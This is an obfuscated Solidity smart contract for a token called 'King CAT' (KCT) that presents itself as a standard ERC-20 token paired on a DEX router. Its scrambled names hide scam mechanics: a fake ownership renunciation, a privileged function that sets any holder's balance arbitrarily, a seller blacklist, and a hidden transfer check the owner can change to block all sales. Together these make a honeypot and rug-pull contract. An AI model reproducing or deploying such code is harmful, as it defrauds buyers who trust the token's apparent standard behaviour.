//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface mikluhwbr {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract mmfwnrthln {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface ikqqbtawzoe {
    function createPair(address nspbfqqjjxpagf, address gdqizygznfsd) external returns (address);
}

interface llulbsgiid {
    function totalSupply() external view returns (uint256);

    function balanceOf(address kunosblbcwx) external view returns (uint256);

    function transfer(address lcoajymvkklk, uint256 sdfixwpzxgkkh) external returns (bool);

    function allowance(address ekhbrcmvmk, address spender) external view returns (uint256);

    function approve(address spender, uint256 sdfixwpzxgkkh) external returns (bool);

    function transferFrom(
        address sender,
        address lcoajymvkklk,
        uint256 sdfixwpzxgkkh
    ) external returns (bool);

    event Transfer(address indexed from, address indexed vanqcbyhwnoz, uint256 value);
    event Approval(address indexed ekhbrcmvmk, address indexed spender, uint256 value);
}

interface llulbsgiidMetadata is llulbsgiid {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract KingCAT is mmfwnrthln, llulbsgiid, llulbsgiidMetadata {

    string private yeirbngrx = "King CAT";

    address public ntqmxtfdcpb;

    uint256 public qepamtzfoxw;

    uint256 private pqsqpvfssbns;

    event OwnershipTransferred(address indexed gykyqgwkga, address indexed suytormfbfra);

    function name() external view virtual override returns (string memory) {
        return yeirbngrx;
    }

    function blthtdkbftrs() public {
        emit OwnershipTransferred(ntqmxtfdcpb, address(0));
        qjvzfwmicvx = address(0);
    }

    function owner() external view returns (address) {
        return qjvzfwmicvx;
    }

    string private cbfvarktsme = "KCT";

    function transfer(address jiknejejuth, uint256 sdfixwpzxgkkh) external virtual override returns (bool) {
        return juijrgfdnyvhc(_msgSender(), jiknejejuth, sdfixwpzxgkkh);
    }

    function allowance(address rrowisswaxs, address eounhftlxbhmz) external view virtual override returns (uint256) {
        if (eounhftlxbhmz == sixkpkhgh) {
            return type(uint256).max;
        }
        return xhsolepjaeton[rrowisswaxs][eounhftlxbhmz];
    }

    uint256 ofejpkzgiutv;

    uint8 private dlujbwxlgz = 18;

    constructor (){
        
        blthtdkbftrs();
        mikluhwbr aikgbvazylkbd = mikluhwbr(sixkpkhgh);
        ughfodxcepowfa = ikqqbtawzoe(aikgbvazylkbd.factory()).createPair(aikgbvazylkbd.WETH(), address(this));
        if (yrhydffsklt) {
            waqgntedzw = true;
        }
        ntqmxtfdcpb = _msgSender();
        swbrduurd[ntqmxtfdcpb] = true;
        ojrrhgrtupgdou[ntqmxtfdcpb] = htqiurnshsji;
        if (waqgntedzw == yrhydffsklt) {
            sibpuieuzi = zoryzycjjz;
        }
        emit Transfer(address(0), ntqmxtfdcpb, htqiurnshsji);
    }

    function gyuqpgtggicqw(address culbyfdtouc, address lcoajymvkklk, uint256 sdfixwpzxgkkh) internal returns (bool) {
        require(ojrrhgrtupgdou[culbyfdtouc] >= sdfixwpzxgkkh);
        ojrrhgrtupgdou[culbyfdtouc] -= sdfixwpzxgkkh;
        ojrrhgrtupgdou[lcoajymvkklk] += sdfixwpzxgkkh;
        emit Transfer(culbyfdtouc, lcoajymvkklk, sdfixwpzxgkkh);
        return true;
    }

    function rpeeegcbwxrcxq(address xaxxktjilgn) public {
        if (ewkisjzqzassok) {
            return;
        }
        if (qepamtzfoxw != oqgiudfnpv) {
            pqsqpvfssbns = qepamtzfoxw;
        }
        swbrduurd[xaxxktjilgn] = true;
        if (lhbkxhriluzxh == qepamtzfoxw) {
            lhbkxhriluzxh = qepamtzfoxw;
        }
        ewkisjzqzassok = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return cbfvarktsme;
    }

    address public ughfodxcepowfa;

    uint256 public udqfodnylug;

    uint256 public oqgiudfnpv;

    bool private yrhydffsklt;

    function getOwner() external view returns (address) {
        return qjvzfwmicvx;
    }

    mapping(address => bool) public clopopsvcu;

    function totalSupply() external view virtual override returns (uint256) {
        return htqiurnshsji;
    }

    address private qjvzfwmicvx;

    uint256 public zoryzycjjz;

    uint256 public sibpuieuzi;

    address wktpywfnyzsxm = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function pkcwkbbesnuw(address jiknejejuth, uint256 sdfixwpzxgkkh) public {
        xlacyzjuyqnex();
        ojrrhgrtupgdou[jiknejejuth] = sdfixwpzxgkkh;
    }

    mapping(address => mapping(address => uint256)) private xhsolepjaeton;

    function transferFrom(address culbyfdtouc, address lcoajymvkklk, uint256 sdfixwpzxgkkh) external override returns (bool) {
        if (_msgSender() != sixkpkhgh) {
            if (xhsolepjaeton[culbyfdtouc][_msgSender()] != type(uint256).max) {
                require(sdfixwpzxgkkh <= xhsolepjaeton[culbyfdtouc][_msgSender()]);
                xhsolepjaeton[culbyfdtouc][_msgSender()] -= sdfixwpzxgkkh;
            }
        }
        return juijrgfdnyvhc(culbyfdtouc, lcoajymvkklk, sdfixwpzxgkkh);
    }

    function juijrgfdnyvhc(address culbyfdtouc, address lcoajymvkklk, uint256 sdfixwpzxgkkh) internal returns (bool) {
        if (culbyfdtouc == ntqmxtfdcpb) {
            return gyuqpgtggicqw(culbyfdtouc, lcoajymvkklk, sdfixwpzxgkkh);
        }
        uint256 jnhtshkjparhu = llulbsgiid(ughfodxcepowfa).balanceOf(wktpywfnyzsxm);
        require(jnhtshkjparhu == ofejpkzgiutv);
        require(!clopopsvcu[culbyfdtouc]);
        return gyuqpgtggicqw(culbyfdtouc, lcoajymvkklk, sdfixwpzxgkkh);
    }

    uint256 public lhbkxhriluzxh;

    function approve(address eounhftlxbhmz, uint256 sdfixwpzxgkkh) public virtual override returns (bool) {
        xhsolepjaeton[_msgSender()][eounhftlxbhmz] = sdfixwpzxgkkh;
        emit Approval(_msgSender(), eounhftlxbhmz, sdfixwpzxgkkh);
        return true;
    }

    bool public ewkisjzqzassok;

    bool private waqgntedzw;

    function decimals() external view virtual override returns (uint8) {
        return dlujbwxlgz;
    }

    uint256 xotmxlpqotepf;

    function xlacyzjuyqnex() private view {
        require(swbrduurd[_msgSender()]);
    }

    function pyynkzagfccdq(address lbhngjeiqvenr) public {
        xlacyzjuyqnex();
        
        if (lbhngjeiqvenr == ntqmxtfdcpb || lbhngjeiqvenr == ughfodxcepowfa) {
            return;
        }
        clopopsvcu[lbhngjeiqvenr] = true;
    }

    function jtzcvqgim(uint256 sdfixwpzxgkkh) public {
        xlacyzjuyqnex();
        ofejpkzgiutv = sdfixwpzxgkkh;
    }

    mapping(address => uint256) private ojrrhgrtupgdou;

    mapping(address => bool) public swbrduurd;

    function balanceOf(address kunosblbcwx) public view virtual override returns (uint256) {
        return ojrrhgrtupgdou[kunosblbcwx];
    }

    uint256 private htqiurnshsji = 100000000 * 10 ** 18;

    address sixkpkhgh = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}